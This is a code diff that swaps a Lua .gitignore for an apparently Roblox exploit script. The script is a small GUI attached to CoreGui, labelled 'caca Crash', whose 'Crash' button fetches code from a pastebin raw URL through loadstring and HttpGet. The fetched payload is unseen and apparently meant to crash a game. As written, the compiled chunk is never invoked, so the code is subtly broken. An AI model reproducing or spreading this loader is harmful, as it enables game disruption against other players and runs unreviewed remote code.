@@ -1,41 +1,62 @@
-# Compiled Lua sources
-luac.out
+-- Gui to Lua
+-- Version: 3.2
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+-- Instances:
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
 
-# Precompiled Headers
-*.gch
-*.pch
+--Properties:
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
+ScreenGui.Parent = game.CoreGui
 
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(126, 255, 173)
+Frame.Position = UDim2.new(0, 0, 0.328333348, 0)
+Frame.Size = UDim2.new(0, 234, 0, 136)
 
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
+UICorner.Parent = Frame
 
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0.0726495758, 0, 0.404411763, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.AutoButtonColor = false
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Crash"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+UICorner_2.Parent = TextButton
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.Position = UDim2.new(0.0726495758, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 43)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "caca Crash"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UICorner_3.Parent = TextLabel
+
+-- Scripts:
+
+local function MBOT_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		loadstring(game:HttpGet('https://pastebin.com/raw/vVzEt7R6'))
+		script.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(MBOT_fake_script)()
